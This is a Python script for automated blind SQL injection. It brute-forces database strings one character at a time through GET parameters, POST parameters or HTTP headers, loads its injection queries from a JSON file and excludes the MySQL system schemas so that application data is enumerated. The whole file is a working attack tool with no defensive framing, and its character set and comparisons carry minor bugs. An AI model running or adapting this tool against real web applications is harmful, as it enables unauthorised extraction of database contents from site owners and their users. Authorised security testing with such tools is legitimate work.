import argparse
import json
import re
import requests
from urllib.parse import quote as urlencode

NOTIN_PLACEHOLDER = 'NOTIN'
BRUTE_CHAR_PLACEHOLDER = '{}'

finish = False
chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
notin = ['information_schema', 'mysql', 'performance_schema', 'sys']


def createBruteQuery(word, query):
    queryParts = query.split(BRUTE_CHAR_PLACEHOLDER)
    qpart2 = '' if len(queryParts) == 1 else queryParts[1]
    brutequery = queryParts[0] + word + qpart2

    return brutequery


def createWord(char, word):
    something = word + char
    return something


def substitutePlaceholders(query):
    notinString = ''.join([("'" + name + "',") for name in notin]).rstrip(',')
    query = re.sub(NOTIN_PLACEHOLDER, notinString, query)

    return query


def inHTTPHeader(payload, url):
    r = requests.get(url, headers=payload)

    return r.text


def inPOSTrequest(payload, url):
    r = requests.post(url, data=payload)

    print(r.request.body)

    return r.text


def inGetRequest(payload, url):
    r = requests.get(url, params=payload)

    return r.text


def preparePayload(parameters, phrase, encode):
    payload = {}

    for param in parameters:

        if (re.search('=', param)):

            p = re.split("=", param)
            if re.search(BRUTE_CHAR_PLACEHOLDER, p[1]):
                newParam = re.sub(BRUTE_CHAR_PLACEHOLDER, phrase, p[1])
            else:
                newParam = p[1]

            payload[p[0]] = newParam

        else:

            payload[param] = urlencode(phrase) if encode == True else phrase

    return payload


def bruteforce(parameters, word, phrase, url, callback, encode):
    global finish
    index = 0

    if not re.search(BRUTE_CHAR_PLACEHOLDER, phrase):
        payload = preparePayload(parameters, phrase, encode)
        return callback(payload, url)

    for char in chars:

        wordCreated = createWord(char, word)
        query = substitutePlaceholders(phrase)
        brutequery = createBruteQuery(wordCreated, query)

        payload = preparePayload(parameters, brutequery, encode)

        r = callback(payload, url)
        result = negativePattern.search(r)

        if not result:
            bruteforce(parameters, wordCreated, phrase, url, callback, encode)

        if index == len(chars) - 1:
            message = '\nFound word: {}'.format(word) if word is not '' else 'Nothing found :('
            print(message)
            finish = True

        if finish == True:
            return r

        index += 1


def runTests(method, parameters, phrasesToTest, url, encode=True):
    global finish

    for phrase in phrasesToTest:

        finish = 0
        phrase = phrase.rstrip('\n')
        print('Testing: {}'.format(phrase))
        queryResult = ''

        if method == 'POST':
            queryResult = bruteforce(parameters, '', phrase, url, inPOSTrequest, encode)

        elif method == 'GET':
            queryResult = bruteforce(parameters, '', phrase, url, inGetRequest, encode)

        elif method == 'HEADER':
            queryResult = bruteforce(parameters, '', phrase, url, inHTTPHeader, encode)

        if not negativePattern.search(queryResult):
            print(' ------------------ !!!! -------------------\n\n\n')
            print('Pattern doesn\'t occur for phrase: \n{}\n\n\n'.format(phrase))
            print(' ------------------ !!!! -------------------')


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run blind sql injection using brutforce")
    parser.add_argument('-f', metavar='filename', default='default-queries.json', type=argparse.FileType('r'),
                        help='File name for your commands in json format, defaults to default-queries.json')
    parser.add_argument('-m', '--method', metavar='method',
                        help='Where to inject (GET - get parameter/default, POST - post parameter, HEADER - header)')
    parser.add_argument('-p', metavar='name', required=True, action='append',
                        help='Name of parameter (for get - param name, post - param name, for header - name of header). If params need to have fixed value use -p submit=true')
    parser.add_argument('-r', metavar='regexp', required=True,
                        help='Regular expression for negative pattern (script search for the pattern and if present - will consider that injection failed and igrone result.)')
    parser.add_argument('-u', metavar='url', required=True, help='Url to test')
    parser.add_argument('-s', '--set', metavar='set_of_queries', default='blind',
                        help='Which set of queries to analyze from json file, for ex. login, blind. Default to blind.')

    args = parser.parse_args()

    negativePattern = re.compile(args.r)

    jsonParsed = json.load(args.f)

    runTests(args.method, args.p, jsonParsed[args.set], args.u)
